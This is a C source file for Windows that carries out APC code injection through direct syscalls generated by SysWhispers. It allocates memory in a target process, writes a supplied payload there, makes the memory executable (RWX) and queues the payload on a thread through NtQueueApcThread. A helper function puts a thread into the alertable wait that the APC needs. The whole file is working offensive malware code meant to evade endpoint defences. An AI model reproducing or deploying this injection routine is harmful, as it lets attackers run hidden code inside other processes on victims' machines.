#include <stdio.h>
#include <Windows.h>
#include "include/syswhispers-apc.h"

BOOL ApcInjectionViaSyscalls(HANDLE hProcess, HANDLE hThread, PVOID pPayload, SIZE_T sSize)
{
	NTSTATUS    STATUS = NULL;
	PVOID       pAddress = NULL;
	ULONG       uOldProtection = NULL;
	SIZE_T      sPayloadSize = sSize;
	SIZE_T		sNumberOfBytesWritten = NULL;

	// Allocating memory
	if ((STATUS = Sw3NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0)
	{
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		goto _Cleanup;
	}
	printf("[+] Allocated Address At :: 0x%p Of Size :: %d \n", pAddress, sPayloadSize);

	// Writing the payload
	printf("[*] Writing Payload Of Size :: %d \n", sSize);
	if ((STATUS = Sw3NtWriteVirtualMemory(hProcess, pAddress, pPayload, sSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSize)
	{
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		goto _Cleanup;
	}
	printf("[*] Bytes Written :: %d of %d \n", sNumberOfBytesWritten, sSize);

	// Changing the memory's permissions to RWX
	if ((STATUS = Sw3NtProtectVirtualMemory(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0)
	{
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		goto _Cleanup;
	}

	// Executing the payload via NtQueueApcThread
	printf("[*] Running Payload At 0x%p Using Thread Of Id : %d ... \n", pAddress, GetThreadId(hThread));
	if ((STATUS = Sw3NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0)
	{
		printf("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
		goto _Cleanup;
	}
	return TRUE;

_Cleanup:
	return FALSE;
}

void RandomFunction()
{
	printf("[*] RandomFunction: Alertable state reached\n");
	SleepEx(INFINITE, TRUE);
}